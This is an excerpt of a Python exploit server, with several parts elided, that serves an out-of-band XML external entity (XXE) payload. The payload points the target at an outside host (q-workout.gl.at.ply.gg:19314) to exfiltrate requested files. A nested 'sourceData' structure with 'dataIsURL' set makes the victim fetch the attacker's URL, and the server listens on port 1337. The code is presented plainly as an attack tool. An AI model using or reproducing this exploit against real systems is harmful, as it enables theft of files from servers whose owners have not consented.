...
class Server:
    ...
    def __init__(self) -> None:
        self.local_url = f"http://YOUR-OPEN-FORWADED-SERVER-FOR-THE-LOCAL-PORT"
...
"""
            ...
            case "obb", path:
                # path = base64.decode(path).decode()
                log.info(f"Received file request for: {path[:100]}")
                response2 = f"""<?xml version="1.0" ?> <!DOCTYPE r [ <!ELEMENT r ANY > <!ENTITY % sp SYSTEM "http://q-workout.gl.at.ply.gg:19314/file/{path}"> %sp; %param1; ]> <r>&exfil;</r>"""


                self.send_response(client_socket, response2)
    ...
    def run(self) -> None:
        self.server_socket.bind(("0.0.0.0", 1337))
                ...
                "address": {
                    "totalsReader": {
                        "collectorList": {
                            "totalCollector": {
                                "sourceData": {
                                    "data": f'http://q-workout.gl.at.ply.gg:19314/obb/{path}',
                                    "dataIsURL":True,
                                    "options": 524290,
                                }
                            }
